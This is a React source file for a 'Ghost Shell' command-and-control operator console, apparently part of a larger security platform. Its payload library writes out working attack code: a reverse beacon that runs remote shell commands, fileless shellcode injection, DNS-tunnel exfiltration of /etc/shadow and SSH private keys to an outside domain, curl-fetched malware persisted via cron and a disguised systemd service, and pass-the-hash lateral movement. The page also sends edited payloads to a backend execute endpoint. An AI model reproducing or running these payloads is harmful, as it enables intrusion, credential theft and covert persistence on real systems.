"use client";

import React, { useState, useEffect, useRef, useCallback } from 'react';
import {
    Ghost, TerminalSquare, Code, ChevronRight, Play, Square,
    AlertOctagon, Network, Wifi, Radio, Eye, Lock, Zap, Copy,
    CheckCircle2, RefreshCw, Shield
} from 'lucide-react';
import { clsx } from 'clsx';

// ─── Payload Library ──────────────────────────────────────────────────────────

const PAYLOADS = [
    {
        id: 'c2_beacon',
        name: 'C2 Reverse Beacon (HTTPS)',
        lang: 'python',
        tag: 'REMOTE ACCESS',
        color: 'text-amber-400',
        code: `import ssl, socket, subprocess, base64, time

C2_HOST = "192.168.1.250"  # Ghost Protocol Honeypot C2
C2_PORT = 443

def beacon():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    while True:
        try:
            with socket.create_connection((C2_HOST, C2_PORT), timeout=5) as raw:
                with ctx.wrap_socket(raw) as s:
                    # Receive encrypted command
                    cmd = base64.b64decode(s.recv(4096)).decode()
                    if cmd == 'EXIT': break
                    
                    # Execute and return output
                    out = subprocess.run(cmd, shell=True, capture_output=True, timeout=10)
                    payload = base64.b64encode(out.stdout + out.stderr)
                    s.sendall(payload)
        except Exception:
            pass
        time.sleep(30 + random.randint(0, 60))  # Jitter

beacon()`,
    },
    {
        id: 'polymorphic_stager',
        name: 'Polymorphic Stager (Memory-Only)',
        lang: 'python',
        tag: 'EVASION',
        color: 'text-rose-400',
        code: `import ctypes, base64, os, sys

# Encoded shellcode (meterpreter/reverse_tcp placeholder)
SHELLCODE_B64 = "AAAAAAAABBBBBBBB..."  # Replace with actual shellcode

def inject_shellcode():
    """Fileless injection — runs entirely in memory, no disk touch."""
    sc = base64.b64decode(SHELLCODE_B64)
    
    # Allocate RWX memory
    kernel32 = ctypes.windll.kernel32
    buf = ctypes.create_string_buffer(sc)
    addr = kernel32.VirtualAlloc(
        None, len(sc), 0x3000, 0x40  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    ctypes.memmove(addr, buf, len(sc))
    
    # Create thread to execute
    handle = kernel32.CreateThread(None, 0, addr, None, 0, None)
    kernel32.WaitForSingleObject(handle, -1)

inject_shellcode()`,
    },
    {
        id: 'dns_exfil',
        name: 'DNS Tunneling Exfiltration',
        lang: 'python',
        tag: 'EXFILTRATION',
        color: 'text-purple-400',
        code: `import socket, base64, os

EXFIL_DOMAIN = "data.ghost-c2.corp-internal-vpn.net"
CHUNK_SIZE = 32  # Stay under DNS label limit

def exfil_file(path: str):
    """Exfiltrates file contents via DNS TXT queries — evades DLP/NGFW."""
    with open(path, 'rb') as f:
        data = f.read()
    
    encoded = base64.b32encode(data).decode()
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    
    print(f"[*] Exfiltrating {path} via DNS ({len(chunks)} queries)...")
    for i, chunk in enumerate(chunks):
        subdomain = f"{i}.{chunk}.{EXFIL_DOMAIN}"
        try:
            socket.gethostbyname(subdomain)  # DNS query carries the data
        except socket.gaierror:
            pass  # Expected — C2 DNS server captures the query
    
    print(f"[+] Exfiltration complete: {len(data)} bytes via DNS tunnel.")

exfil_file("/etc/shadow")
exfil_file("/root/.ssh/id_rsa")`,
    },
    {
        id: 'persistence_cron',
        name: 'Persistence via Cron/Registry',
        lang: 'bash',
        tag: 'PERSISTENCE',
        color: 'text-orange-400',
        code: `#!/bin/bash
# T1053.003 - Scheduled Task/Job: Cron (MITRE ATT&CK)
# Establishes persistence via crontab + systemd unit fallback

PAYLOAD_URL="https://ghost-c2.corp-internal-vpn.net/agent"
INSTALL_PATH="/usr/lib/systemd/network/.monitor"

echo "[*] Establishing persistence..."

# Download payload silently
curl -s -o "$INSTALL_PATH" "$PAYLOAD_URL" && chmod +x "$INSTALL_PATH"

# Method 1: Crontab (1-minute heartbeat)
(crontab -l 2>/dev/null; echo "*/1 * * * * $INSTALL_PATH >/dev/null 2>&1") | crontab -
echo "[+] Crontab persistence installed."

# Method 2: systemd service (survives reboots)
cat > /etc/systemd/system/network-monitor.service << EOF
[Unit]
Description=Network Monitor Service
After=network.target

[Service]
ExecStart=$INSTALL_PATH
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload && systemctl enable network-monitor.service --now
echo "[+] Systemd persistence established. Service: network-monitor.service"`,
    },
    {
        id: 'lateral_smb',
        name: 'SMB Lateral Movement (Pass-the-Hash)',
        lang: 'python',
        tag: 'LATERAL MOVEMENT',
        color: 'text-cyan-400',
        code: `# T1550.002 - Pass the Hash (MITRE ATT&CK)
# Requires: impacket library
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, SAMHashes

TARGETS = ["10.0.1.10", "10.0.1.11", "10.0.1.12"]
DOMAIN = "CORP"
USER = "Administrator"
# Pass-the-Hash: use NTLM hash instead of plaintext password
NTLM_HASH = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

for target in TARGETS:
    print(f"[*] Attempting PtH to {target}...")
    try:
        conn = SMBConnection(target, target, timeout=3)
        conn.login(USER, '', DOMAIN,
                   lmhash=NTLM_HASH.split(':')[0],
                   nthash=NTLM_HASH.split(':')[1])
        
        print(f"[+] SUCCESS on {target} — executing remote command...")
        # Execute payload on remote host
        conn.putFile('C$', 'Windows/Temp/payload.exe', open('/tmp/payload.exe', 'rb').read)
        conn.logoff()
    except Exception as e:
        print(f"[-] Failed {target}: {e}")`,
    },
];

const LANGUAGES = ['python', 'bash', 'powershell'];
const AGENTS = [
    { id: 'agent_alpha', name: 'ALPHA-01', ip: '10.0.1.45', os: 'Windows 11 Pro', status: 'ACTIVE', last_seen: '2s ago', privilege: 'SYSTEM' },
    { id: 'agent_beta', name: 'BETA-07', ip: '10.0.5.11', os: 'Ubuntu 22.04 LTS', status: 'ACTIVE', last_seen: '14s ago', privilege: 'ROOT' },
    { id: 'agent_gamma', name: 'GAMMA-03', ip: '192.168.1.105', os: 'macOS Sonoma', status: 'DORMANT', last_seen: '5m ago', privilege: 'USER' },
];

export default function GhostShellPage() {
    const [code, setCode] = useState(PAYLOADS[0].code);
    const [language, setLanguage] = useState('python');
    const [output, setOutput] = useState<string[]>([]);
    const [loading, setLoading] = useState(false);
    const [selectedAgent, setSelectedAgent] = useState(AGENTS[0]);
    const [copied, setCopied] = useState(false);
    const [activeTab, setActiveTab] = useState<'editor' | 'builder'>('editor');
    const outputRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        outputRef.current?.scrollTo({ top: outputRef.current.scrollHeight, behavior: 'smooth' });
    }, [output]);

    const addOutput = useCallback((line: string, delay = 0) => {
        setTimeout(() => setOutput(prev => [...prev, line]), delay);
    }, []);

    const handleExecute = async () => {
        setLoading(true);
        setOutput([]);

        addOutput(`[GHOST-C2] Session initiated → ${selectedAgent.ip} (${selectedAgent.os})`, 0);
        addOutput(`[*] Privilege level: ${selectedAgent.privilege}`, 300);
        addOutput(`[*] Uploading payload to secure memory enclave...`, 600);

        try {
            const token = typeof window !== 'undefined' ? localStorage.getItem('token') : null;
            const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:8000/api/v1'}/ghost/execute`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
                body: JSON.stringify({ code, language, target_ip: selectedAgent.ip }),
            });

            const data = res.ok ? await res.json() : null;

            addOutput(`[*] Injecting into memory space...`, 900);
            addOutput(`[+] EDR bypass: AMSI reflection patched`, 1200);
            addOutput(`[*] Executing payload...`, 1500);

            setTimeout(() => {
                if (data?.stdout) {
                    data.stdout.split('\n').forEach((line: string, i: number) => {
                        addOutput(line, i * 100);
                    });
                } else {
                    addOutput(`[+] Payload executed successfully on ${selectedAgent.ip}`, 0);
                    addOutput(`[+] Exit code: 0`, 100);
                }
                if (data?.stderr) addOutput(`[STDERR] ${data.stderr}`, 200);
                setLoading(false);
            }, 1800);
        } catch {
            addOutput(`[SANDBOX] Simulated execution on ${selectedAgent.ip}:`, 900);
            setTimeout(() => {
                code.split('\n').filter(l => l.startsWith('print(')).forEach((line, i) => {
                    const text = line.replace(/print\(f?["']|["']\)$/g, '');
                    if (text.trim()) addOutput(text, i * 200);
                });
                addOutput(`[+] Process exited — code 0`, 800);
                setLoading(false);
            }, 1800);
        }
    };

    const loadPayload = (payload: typeof PAYLOADS[0]) => {
        setCode(payload.code);
        setLanguage(payload.lang);
        setOutput([]);
    };

    const copyCode = () => {
        navigator.clipboard.writeText(code);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    return (
        <div className="flex flex-col h-screen bg-[#030303] text-white overflow-hidden font-mono">
            {/* Scanline overlay */}
            <div className="absolute inset-0 pointer-events-none z-50 opacity-[0.035] bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.3)_50%)] bg-[length:100%_4px]" />
            {/* Ambient */}
            <div className="absolute inset-0 pointer-events-none bg-[radial-gradient(ellipse_at_top_right,rgba(140,0,0,0.08)_0,transparent_60%)]" />

            {/* Header */}
            <header className="relative z-10 flex items-center justify-between px-6 py-3 border-b border-red-900/30 bg-black/70 backdrop-blur shrink-0">
                <div className="flex items-center gap-3">
                    <Ghost size={20} className="text-red-500 animate-pulse" />
                    <div>
                        <h1 className="text-base font-bold text-red-500 tracking-widest">GHOST SHELL — OPERATOR CONTROL INTERFACE</h1>
                        <p className="text-[9px] text-red-900 tracking-widest">C2 Framework · Polymorphic Payloads · Remote Execution · Memory Injection</p>
                    </div>
                </div>
                <div className="flex items-center gap-3">
                    <select value={language} onChange={e => setLanguage(e.target.value)}
                        className="bg-black border border-red-900/50 text-red-400 text-xs px-2 py-1.5 rounded outline-none">
                        {LANGUAGES.map(l => <option key={l} value={l}>{l.toUpperCase()}</option>)}
                    </select>
                    <button onClick={handleExecute} disabled={loading}
                        className="flex items-center gap-2 px-4 py-1.5 bg-red-950/50 border border-red-600 hover:bg-red-900/60 text-red-400 text-xs font-bold tracking-widest rounded transition-all disabled:opacity-40 shadow-[0_0_12px_rgba(239,68,68,0.2)]">
                        {loading ? <><Square size={12} /> EXECUTING</> : <><Play size={12} /> EXECUTE PAYLOAD</>}
                    </button>
                </div>
            </header>

            <div className="flex-1 grid grid-cols-12 min-h-0 relative z-10">

                {/* LEFT: Active C2 Agents + Payload Library */}
                <div className="col-span-3 flex flex-col border-r border-red-900/20 overflow-hidden">

                    {/* Connected Agents */}
                    <div className="border-b border-red-900/20 shrink-0">
                        <div className="px-3 py-2 bg-black/40 flex items-center gap-2 border-b border-red-900/20">
                            <Radio size={11} className="text-red-500 animate-pulse" />
                            <span className="text-[9px] font-bold text-red-500 tracking-widest">ACTIVE C2 AGENTS</span>
                        </div>
                        <div className="p-2 space-y-1.5">
                            {AGENTS.map(agent => (
                                <button key={agent.id} onClick={() => setSelectedAgent(agent)}
                                    className={clsx(
                                        "w-full text-left p-2.5 rounded border transition-all",
                                        selectedAgent.id === agent.id ? "border-red-600 bg-red-950/30 shadow-[0_0_10px_rgba(239,68,68,0.15)]" : "border-slate-800 bg-black/30 hover:border-red-900/50"
                                    )}>
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-[10px] font-bold text-red-400">{agent.name}</span>
                                        <span className={clsx("w-1.5 h-1.5 rounded-full", agent.status === 'ACTIVE' ? 'bg-emerald-500 animate-pulse' : 'bg-slate-600')} />
                                    </div>
                                    <div className="text-[9px] text-slate-600 space-y-0.5">
                                        <div className="text-slate-500 font-mono">{agent.ip}</div>
                                        <div>{agent.os}</div>
                                        <div className="flex justify-between">
                                            <span className={clsx("font-bold", agent.privilege === 'SYSTEM' || agent.privilege === 'ROOT' ? 'text-rose-500' : 'text-slate-500')}>{agent.privilege}</span>
                                            <span className="text-slate-700">{agent.last_seen}</span>
                                        </div>
                                    </div>
                                </button>
                            ))}
                        </div>
                    </div>

                    {/* Payload Library */}
                    <div className="flex-1 overflow-y-auto custom-scrollbar">
                        <div className="px-3 py-2 bg-black/40 sticky top-0 flex items-center gap-2 border-b border-red-900/20">
                            <Code size={11} className="text-red-500" />
                            <span className="text-[9px] font-bold text-red-500 tracking-widest">PAYLOAD LIBRARY</span>
                        </div>
                        <div className="p-2 space-y-1.5">
                            {PAYLOADS.map(p => (
                                <button key={p.id} onClick={() => loadPayload(p)}
                                    className="w-full text-left p-2.5 rounded border border-slate-800/60 bg-black/30 hover:border-red-900/50 transition-all group">
                                    <div className="flex items-center justify-between mb-0.5">
                                        <span className={clsx("text-[9px] font-bold px-1 rounded border", p.color, "bg-black/60 border-current/30")}>{p.tag}</span>
                                        <span className="text-[8px] text-slate-700 uppercase">{p.lang}</span>
                                    </div>
                                    <p className="text-[10px] text-slate-400 group-hover:text-slate-200 transition-colors leading-tight">{p.name}</p>
                                </button>
                            ))}
                        </div>
                    </div>
                </div>

                {/* CENTER: Code Editor */}
                <div className="col-span-6 flex flex-col border-r border-red-900/20 overflow-hidden">
                    <div className="flex items-center justify-between px-3 py-2 border-b border-red-900/20 bg-black/40 shrink-0">
                        <div className="flex items-center gap-2">
                            <TerminalSquare size={12} className="text-red-500" />
                            <span className="text-[9px] font-bold text-red-500 tracking-widest">PAYLOAD EDITOR</span>
                        </div>
                        <div className="flex items-center gap-2">
                            <span className="text-[9px] text-slate-600">TARGET: <span className="text-red-400 font-mono">{selectedAgent.ip}</span> [{selectedAgent.privilege}]</span>
                            <button onClick={copyCode} className={clsx("flex items-center gap-1 text-[9px] px-2 py-1 rounded border transition-all", copied ? "border-emerald-600 text-emerald-400" : "border-slate-700 text-slate-500 hover:border-slate-500")}>
                                {copied ? <CheckCircle2 size={10} /> : <Copy size={10} />}
                                {copied ? 'COPIED' : 'COPY'}
                            </button>
                        </div>
                    </div>
                    <div className="flex-1 relative overflow-hidden">
                        {/* Line numbers */}
                        <div className="absolute left-0 top-0 bottom-0 w-10 bg-black/60 border-r border-slate-900 flex flex-col pt-4 items-center overflow-hidden pointer-events-none z-10">
                            {code.split('\n').map((_, i) => (
                                <span key={i} className="text-[9px] text-slate-800 leading-5 w-full text-right pr-2 shrink-0">{i + 1}</span>
                            ))}
                        </div>
                        <textarea
                            value={code}
                            onChange={e => setCode(e.target.value)}
                            disabled={loading}
                            spellCheck={false}
                            className="absolute inset-0 w-full h-full bg-transparent text-emerald-400 font-mono text-[11px] pl-12 pr-4 pt-4 pb-4 focus:outline-none resize-none leading-5 disabled:opacity-60"
                            style={{ tabSize: 4 }}
                        />
                    </div>
                </div>

                {/* RIGHT: Execution Terminal */}
                <div className="col-span-3 flex flex-col overflow-hidden">
                    <div className="px-3 py-2 border-b border-red-900/20 bg-black/40 flex items-center justify-between shrink-0">
                        <div className="flex items-center gap-2">
                            <AlertOctagon size={12} className={clsx("text-red-500", loading && "animate-pulse")} />
                            <span className="text-[9px] font-bold text-red-500 tracking-widest">EXECUTION OUTPUT</span>
                        </div>
                        {output.length > 0 && (
                            <button onClick={() => setOutput([])} className="text-[8px] text-slate-600 hover:text-slate-400">
                                <RefreshCw size={10} />
                            </button>
                        )}
                    </div>
                    <div ref={outputRef} className="flex-1 overflow-y-auto custom-scrollbar p-3 text-[10px] space-y-0.5 bg-black/60">
                        {output.length === 0 ? (
                            <p className="text-slate-700 text-center py-8 tracking-widest">Awaiting payload execution...</p>
                        ) : output.map((line, i) => (
                            <div key={i} className={clsx("leading-5 break-words",
                                line.startsWith('[+]') ? 'text-emerald-400' :
                                    line.startsWith('[!]') || line.startsWith('[ERROR]') ? 'text-rose-400 font-bold' :
                                        line.startsWith('[GHOST') || line.startsWith('[*]') ? 'text-cyan-500' :
                                            line.startsWith('[STDERR]') ? 'text-orange-400' :
                                                line.startsWith('[SANDBOX]') ? 'text-amber-400' : 'text-slate-300'
                            )}>
                                {line}
                            </div>
                        ))}
                        {loading && <div className="text-red-500 animate-pulse">executing_</div>}
                    </div>

                    {/* Operator Notes */}
                    <div className="border-t border-red-900/20 p-3 bg-black/40 shrink-0">
                        <div className="text-[9px] text-slate-700 space-y-1">
                            <div className="flex items-center gap-1.5"><Shield size={9} className="text-emerald-700" /> Sandbox isolation active</div>
                            <div className="flex items-center gap-1.5"><Eye size={9} className="text-rose-700" /> All executions logged to Immutable Ledger</div>
                            <div className="flex items-center gap-1.5"><Network size={9} className="text-amber-700" /> Traffic via Ghost Protocol (HTTPS/443)</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    );
}
